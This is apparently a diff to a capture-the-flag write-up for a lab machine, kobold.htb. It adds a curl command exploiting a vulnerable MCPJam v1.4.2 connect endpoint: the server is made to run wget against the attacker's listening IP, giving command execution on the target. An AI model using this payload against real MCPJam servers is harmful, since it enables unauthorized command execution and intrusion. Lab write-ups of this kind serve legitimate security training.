@@ -120,6 +120,12 @@ bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Dura
 
 MCPJam Version: v1.4.2 is vulnerabe
 
+```
+curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"exploit"}'
+```
+
 ---
 ## Foothold
 
